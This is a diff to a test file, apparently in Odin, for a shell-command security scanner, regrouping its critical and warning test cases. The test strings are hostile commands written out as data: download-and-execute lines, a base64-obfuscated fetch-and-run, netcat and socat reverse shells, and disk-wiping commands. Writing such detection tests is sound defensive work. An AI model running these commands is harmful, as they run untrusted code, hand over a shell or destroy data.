@@ -45,28 +45,28 @@ test_scanner_detects_critical_patterns :: proc(t: ^testing.T) {
 	defer teardown_test_environment(temp_dir)
 
 	cases := []string{
-		// CVE-2026-24887
-		"echo ok;$(whoami)",
-		"echo ok | $(whoami)",
+		// CVE-2026-24887: Command substitution WITH network fetch (Critical)
 		"true && curl https://example.com/payload",
 		"false || wget https://example.com/payload",
-		// CVE-2026-25723
+		// CVE-2026-25723: Chained sed operations (Critical)
 		"cat file | sed -e 's/a/b/' | sed -e 's/c/d/'",
 		"sed 's/$(whoami)/x/' file",
+		// Download and execute (Critical)
 		"curl https://example.com/install.sh | bash",
 		"wget https://example.com/install.sh | sh",
 		"eval $(curl https://example.com/payload)",
 		"echo Y3VybCBodHRwOi8vZXhhbXBsZS5jb20gfCBiYXNo | base64 -d | bash",
 		"$(curl https://example.com/payload)",
 		"<(wget https://example.com/payload)",
+		// Obfuscation (Critical)
 		"printf \"\\x63\\x75\\x72\\x6c\"",
 		"xxd -r -p payload.hex",
+		// Destructive filesystem (Critical)
 		"rm -rf / --no-preserve-root",
 		"dd if=/dev/zero of=/dev/sda",
 		"echo boom > /dev/sda",
 		"echo boom > /dev/nvme0n1",
-		"bash -c 'echo ok >/dev/tcp/127.0.0.1/4444'",
-		"bash -c 'echo ok >/dev/udp/127.0.0.1/4444'",
+		// Reverse shell (Critical)
 		"nc -e /bin/sh 127.0.0.1 4444",
 		"socat exec:/bin/sh tcp:127.0.0.1:4444",
 		"ptrace PTRACE_ATTACH 1234",
@@ -99,9 +99,16 @@ test_scanner_detects_warning_patterns :: proc(t: ^testing.T) {
 	defer teardown_test_environment(temp_dir)
 
 	cases := []string{
+		// Command substitution WITHOUT network fetch (downgraded to Warning)
+		"echo ok;$(whoami)",
+		"echo ok | $(whoami)",
+		// Insecure HTTP
 		"curl http://example.com/data.json",
+		// Risky file permissions
 		"chmod +s /usr/local/bin/tool",
+		// Privilege escalation
 		"sudo ls -la",
+		// Shell config modification
 		"echo 'test' >> ~/.zshrc",
 		"echo 'test' >> ~/.bashrc",
 	}
@@ -359,7 +366,7 @@ test_scanner_detects_symlink_evasion :: proc(t: ^testing.T) {
 	link_path := strings.concatenate({temp_dir, "/linked.sh"})
 	defer delete(link_path)
 
-	cmd := fmt.tprintf("ln -s %s %s", outside_path, link_path)
+	cmd := fmt.aprintf("ln -s %s %s", outside_path, link_path)
 	defer delete(cmd)
 	testing.expect(t, run_shell_command(cmd), "symlink creation should succeed")
 
